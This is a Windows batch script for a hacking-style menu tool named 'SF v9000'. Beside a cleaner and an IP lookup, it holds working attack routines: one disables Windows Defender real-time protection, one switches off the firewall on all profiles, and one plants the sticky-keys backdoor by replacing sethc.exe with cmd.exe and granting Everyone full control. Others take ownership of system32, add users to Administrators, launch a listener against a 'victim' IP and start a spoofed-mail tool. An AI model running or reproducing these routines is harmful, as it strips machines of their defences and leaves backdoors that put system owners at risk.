cd ..
@echo off
color 0a
title SF v9000
mode con: cols=100 lines=30
call :checktitle
set log=bin\log.lmao
set cmd=bin\command.bat
if exist bin\*.tmp del bin\*.tmp >nul

::delete comment from next line if adminchecks are not working properly
::call :admincheck 

call :comradecheck 
goto :intro

:checktitle
tasklist /fi "imagename eq cmd.exe" /fo list /v | find "Administrator:  SF v9000" >nul
if %errorlevel%==0 goto checktitleadmin
bin\cmdow.exe "SF v9000" /MOV 325 1 
bin\cmdow.exe "SF v9000" /ACT 
set admin=false
goto :eof


:checktitleadmin
bin\cmdow.exe "Administrator:  SF v9000" /MOV 325 1 
bin\cmdow.exe "Administrator:  SF v9000" /ACT 
set admin=true

goto :eof

:comradecheck
tasklist | find "comrade.exe"
if %errorlevel%==0 set comradeapp=true && goto :eof
set comradeapp=false
goto :eof

:logo
echo. && type "bin\logos\logo.lmao" && goto :eof

:intro
cls
call :logo
echo.
echo.
if %comradeapp%==true echo 		Comrade is running && echo ComradeRunning = True >> %log%
if %comradeapp%==false echo 		Comrade is not running && echo ComradeRunning = False >> %log%
if %admin%==true echo 		AdminPriv = True && echo AdminPrivileges = True >> %log%
if %admin%==false echo 		AdminPriv = False && echo AdminPrivileges = False >> %log%
echo.
echo.
goto start

:start
color 0a
echo.
set /p "input= input //>  "
if "%input%"=="help" goto help
if "%input%"=="exit" goto exit
if "%input%"=="cmd" echo. && call :log && call cmd && goto start
if "%input%"=="ftp" goto ftp
if "%input%"=="create_user" goto create_user
if "%input%"=="user_modify" goto user_modify
if "%input%"=="refresh" echo. && echo refreshing system... && start call Refresh.exe && pause >nul
if "%input%"=="takeshift" goto takeshift
if "%input%"=="takehq" goto takehq
if "%input%"=="runadmin" goto runadmin
if "%input%"=="clean" goto clean
if "%input%"=="pyroot" goto pyroot
if "%input%"=="waterbucket" goto waterbucket
if "%input%"=="firebucket" goto firebucket
if "%input%"=="winattack" goto winattack
if "%input%"=="windefend" goto windefend
if "%input%"=="website" goto website
if "%input%"=="incognito" call :log && goto incognito
if "%input%"=="ip" goto ip
if "%input%"=="phonymail" goto phonymail
if "%input%"=="stop_matrix" goto stop_matrix
if "%input%"=="boot_matrix" goto matrix
if "%input%"=="reload_con" goto reload_con
if "%input%"=="clean_ear" goto open_port
if "%input%"=="ear2ear" goto ear_to_ear
if "%input%"=="white_swan" goto white_swan
echo Invalid Command "%input%" >> %log%
echo Type 'help' for a list of cmds >> %log%
goto Start

:white_swan
call :log
echo.
echo.
echo.
echo Opening WHITE_SWAN...
timeout /t 2 >nul
cd bin
start call "WS.bat"
cd ..
goto intro

:ear_to_ear
call :log
cls
type bin\logos\listener.lmao
cd bin
echo.
echo.
echo.
set /p ipvictim=Enter the IP of the Victim (type Q to go back): 
if /I %ipvictim%==Q cd .. && goto intro
echo set ipvictim=%ipvictim% >> ipvictim.bat
start call ear2ear.bat
timeout /t 3 >nul
del ipvictim.bat
cd ..
goto intro

:open_port
call :log
call :checkpriv
cls
type bin\logos\listener.lmao
echo.
echo.
echo.
echo 	Cleaing ears...
cd bin
echo.
echo 	Starting port [9000]
start call qTIP.bat
echo.
echo 	COMPLETE [*]
cd ..
timeout /t 2 >nul
goto intro

:reload_con
call :log
echo.
echo Reloading console...
timeout /t 2 >nul
echo reload >> bin\reload.bat
start call bin\console.bat
goto intro

:stop_matrix
call :log
echo.
echo Shutting down datasystems...
timeout /t 2 >NUL
echo set matrix=0 >> %cmd%
goto intro

:ip
call :log
for /f "tokens=14" %%i in ('ipconfig ^| find "IPv4"') do set ipv4=%%i
echo.
echo 	Current Computer's IPv4 ^> %ipv4%
echo.
goto start

:matrix
call :log
echo.
echo F) fast
echo N) normal
echo.
choice/c:fn /n /m "Press a key representing the speed of the visual matrix (f-n): "
if %errorlevel%==2 set mspeed=normal
if %errorlevel%==1 set mspeed=fast
echo Booting up %mspeed% datasystems...
timeout /t 2 >nul
echo set matrix=1 >> %cmd%
echo set matrixspeed=%mspeed% >> %cmd%
goto intro



:incognito
call :log
call :checkpriv
cls
type bin\logos\incognito.lmao
echo.
echo.
echo.
echo 	Select an Option
echo.
echo 	1) Check Stock
echo 	2) Erase Stock
echo.
echo 	3) Go Back
choice/c:123 /n /m "(1-3):  "
if errorlevel==3 goto :intro
if errorlevel==2 (
echo.
echo Enter the wrong code to get back
"bin\externalware\Clean.exe"
timeout 1 >nul
goto incognito
)
if errorlevel==1 (
echo.
echo Enter the wrong code to get back, or type 'exit' when you're in
"bin\externalware\Stock.exe"
timeout 1 >nul
goto incognito
)

:website
call :log
echo.
echo Opening [www.root2mymind.com]...
start www.root2mymind.com
timeout 1 >nul
echo.
goto start

:winattack
call :log
call :checkpriv
echo.
echo 	Attacking Windows Defenders...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
echo.
echo 	Windows defenders are dead!
echo.
goto start

:windefend
call :log
call :checkpriv
echo.
echo 	Producing Windows Defenders...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
echo.
echo 	Windows Defenders have been produced!
echo.
goto start

:waterbucket
call :log
call :checkpriv
echo.
echo 	Cooling Down Windows Firewall...
NetSh Advfirewall set allprofiles state off
echo.
echo 	Windows Firewall has been Successfully Extinguished!
echo.
goto start

:firebucket
call :log
call :checkpriv
echo.
echo 	Lighting Windows Firewall...
NetSh Advfirewall set allprofiles state on
echo.
echo	 Windows Firewall has been Successfully Lit!
echo.
goto start



:clean
set junk=0
set size1=0
set size2=0
set size3=0
set product=0
set original_cd=%cd%
call :log
call :checkpriv
set size1=0
cd %temp%
for /r %%x in (\*) do set /a size1+=%%~zx
set /a size1/=1000
set size2=0
cd "%systemroot%\Temp"
for /r %%x in (\*) do set /a size2+=%%~zx
set /a size2/=1000
set size3=0
cd "%systemroot%\Prefetch"
for /r %%x in (\*) do set /a size3+=%%~zx
set /a size3/=1000
set junk=0
set /a product+=%size1% + %size2% + %size3%
set junk=%product% KB
goto clean_pc01

:clean_pc01

cd "%original_cd%"
cls
echo.
type bin\logos\clean.lmao
echo.
echo 	This will not affect your needed files.
echo.
echo 		You have %junk% of files - ready to be deleted!
echo.
choice/c:yn /n /m "Clean? (Y/N): "
if errorlevel==2 goto :intro
if errorlevel==1 goto clean_pc02

:clean_pc02
cls
echo 	Cleaning in progress...
echo 	(any errors will appear)
ping localhost -n 2 >nul
echo.
echo 	Deleting %%temp%%...
echo.
rmdir /q /s %temp%
if not exist %temp% mkdir %temp%
echo.
echo 	Deleting %systemroot%\Temp...
echo.
rmdir /q /s %systemroot%\Temp
if not exist %systemroot%\Temp mkdir %systemroot%\Temp
echo.
echo 	Deleting %systemroot%\Prefetch...
echo.
rmdir /q /s %systemroot%\Prefetch
if not exist %systemroot%\Prefetch mkdir %systemroot%\Prefetch
echo.
echo 	Cleaning Process has been completed...
echo.
set product2=0
cd %temp%
for /r %%x in (\*) do set /a size1+=%%~zx
set /a size1/=1000
set size2=0
cd "%systemroot%\Temp"
for /r %%x in (\*) do set /a size2+=%%~zx
set /a size2/=1000
set size3=0
cd "%systemroot%\Prefetch"
for /r %%x in (\*) do set /a size3+=%%~zx
set /a size3/=1000
set /a product2+=%size1% + %size2% + %size3%
set /a product-=%product2%
echo.
echo.
echo 	~ %product% KB of Junk Deleted! ~
cd %original_cd%
echo.
echo Press anykey to continue...
pause >nul
goto :intro


:runadmin
if %admin%==true (
echo.
echo 	Already Running as Admin
echo.
goto start
)
cls
color a0
echo Terminating and running as Admin...
timeout 2 >nul

echo set exit=1 >> %cmd%
"RunAsAdmin [Recommended].exe"
exit

:takehq
call :log
cls
type bin\logos\takehq.lmao
echo.
echo.
call :checkpriv
echo.
echo.
echo 	would you like to continue? Y:N
choice/c:yn /n
if errorlevel==2 goto :intro
if errorlevel==1 goto :takehq2

:takehq2
cls
type bin\logos\takehq.lmao
echo.
takeown /R /F "%systemroot%\system32"
echo.
echo.
echo.
echo Process COMPLETE [*]
timeout 2 >nul
goto :intro

:takeshift
call :log
cls
type bin\logos\takeshift.lmao
echo.
call :checkpriv
echo.
echo.
echo 	would you like to continue? Y:N
choice/c:yn /n
if errorlevel==2 goto :intro
if errorlevel==1 goto :takeshift_2



:takeshift_2
cls
type bin\logos\takeshift.lmao
echo.
echo.
echo.
echo 	The process will now begin.
timeout 2 >nul
echo.
echo 	taking ownership of sethc.exe...
takeown /F "%systemroot%\system32\sethc.exe"
icacls "%systemroot%\system32\sethc.exe" /grant Administrators:F
icacls "%systemroot%\system32\sethc.exe" /grant Users:F
icacls "%systemroot%\system32\sethc.exe" /grant Everyone:F
echo.
echo 	sethc.exe is now owned by %username% [*]
echo.
echo 	renaming sethc.exe to sethc2.exe...
rename "%systemroot%\system32\sethc.exe" "sethc2.exe"
echo.
echo 	sethc.exe renamed to sethc2.exe [*]
echo.
echo 	copying and renaming cmd.exe to sethc.exe...
copy "%systemroot%\system32\cmd.exe" "%systemroot%\system32\sethc.exe"
echo.
echo 	copied and renamed cmd.exe to sethc.exe [*]
echo.
echo 	PROCESS COMPLETE [*]
echo.
pause
goto intro



:user_modify
call :log
echo.
echo.
echo Useraccounts on system..
echo.
wmic useraccount get name
echo.
echo 	Input User account name to modify (type 'back' to go back)
set /p "useraccount= input // user account //:  "
if %useraccount%==back goto intro
if "%useraccount%"=="" (
echo.
echo 	Cannot edit a blank user.
echo.
echo Press anykey to go back...
pause >nul
goto start
)
echo.
echo 	Would you like to edit the user "%useraccount%"
echo.
choice/c:yn /n /m " input // user account // choice (Y/N)//:  "
if errorlevel==2 (
goto intro
)
if errorlevel==1 (
set useraccountEDIT="%useraccount%"
goto edit_user_gui
)


:edit_user_gui
cls
type bin\logos\user.lmao
echo.
call :checkpriv
echo.
echo.
echo. 		Editing User %useraccountEDIT%
echo 	1) Edit Password
echo 	2) Edit Active/Deactive
echo 	3) Edit Localgroup
echo 	4) DELETE
echo 5) Back
choice/c:12345 /n /m " input // edit_user // choice(1-5) //:  "
if errorlevel==5 goto intro
if errorlevel==4 goto delete_user
if errorlevel==3 goto localgroup_user
if errorlevel==2 goto active_user
if errorlevel==1 goto password_user

:localgroup_user
echo.
echo (A)min
echo (G)uest
echo (U)ser
echo.
echo (B)ack
echo.
choice/c:agub /n /m "Press a letter indicating the option: "
if errorlevel==4 goto :edit_user_gui
if errorlevel==3 (
net localgroup Users %useraccountEDIT% /ADD
echo.
echo Group 'Users' has now been added to %useraccountEDIT% 
pause >nul
goto :edit_user_gui
)
if errorlevel==2 (
net localgroup Guests %useraccountEDIT% /ADD
echo.
echo Group 'Guests' has now been added to %useraccountEDIT% 
pause >nul
goto :edit_user_gui
)
if errorlevel==1 (
net localgroup Administrators %useraccountEDIT% /ADD
echo.
echo Group 'Administrators' has now been added to %useraccountEDIT% 
pause >nul
goto :edit_user_gui
)

:active_user
echo.
echo (A)ctivate or (D)activate ?
choice/c:ad /n
if errorlevel==2 (
net user %useraccountEDIT% /active:no
echo.
echo Deactivated user %useraccountEDIT%
pause >nul
goto edit_user_gui
)
if errorlevel==1 (
net user %useraccountEDIT% /active:yes
echo.
echo Activated user %useraccountEDIT%
pause >nul
goto edit_user_gui
)


:delete_user
echo.
echo 	Are you sure you want to delete the user %useraccountEDIT%?
echo.
echo 			1=yes 2=no
echo.

choice/c:12 /n /m " input // edit_user // choice(1/2) //:  "
if errorlevel==2 goto user_y
if errorlevel==1 goto user_n
goto delete_user
:user_n
echo.
echo 	deleting user %useraccountEDIT%...
net user %useraccountEDIT% /del
timeout 1 >nul
echo.
echo 	USER DELETED
timeout 2 >nul
goto intro
:user_y
echo.
echo User not deleted...
timeout 2 >nul
goto edit_user_gui


:create_user
call :log
echo.
call :checkpriv
echo.
echo 	Create a user account. (type 'back' to go back)
set /p "newuser= input // new username //:  "
if "%newuser%"=="" goto create_user_blank
if %newuser%==back goto :intro
echo.
echo 	Are you sure you want to create a user
echo 	with the name "%newuser%"? (Y/N)
echo.
choice/c:yn /n /M " input // new username // choice (Y/N) //: "
if errorlevel==2 goto n
if errorlevel==1 goto y

:Y 
net user "%newuser%" /ADD && echo. && echo User created with name "%newuser%" && echo. && echo Press anykey to go back... && pause >nul && goto start


:N
echo. && echo User not created. && echo. && echo Press anykey to go back... && pause >nul && goto start



:create_user_blank
echo.
echo The username cannot be BLANK
echo.
echo Press anykey to go back...
pause >nul
goto :start
	


:ftp
call :log
cls
echo -= FTP Terminal =-
echo.
ftp
goto intro


:log
echo Command Executed "%input%" [*] >> bin\log.lmao
goto :eof

:help
call :log
echo.
type bin\list.lmao
echo.
goto start

:exit
call :log
echo Terminating Process [*] >> %log%
echo.
echo Terminating Process...
timeout 1 >nul
echo set exit=1 >> %cmd%
exit


:admincheck
set admincheckuser=%random%%random%
net user %admincheckuser% /ADD >nul
if not %errorlevel%==0 set admin=false && goto :eof
if %errorlevel%==0 set admin=true && net user %admincheckuser% /DEL >nul && goto :eof

:checkpriv
if %admin%==false (
echo You cannot use this feature without Admin Priv!
echo.
echo Press anykey to go back...
pause >NUL
goto :intro
)
if %admin%==true goto :eof

:phonymail
cd bin\phonymail
start call "PhonyMail (remastered).bat"
cd ..
cd ..
goto intro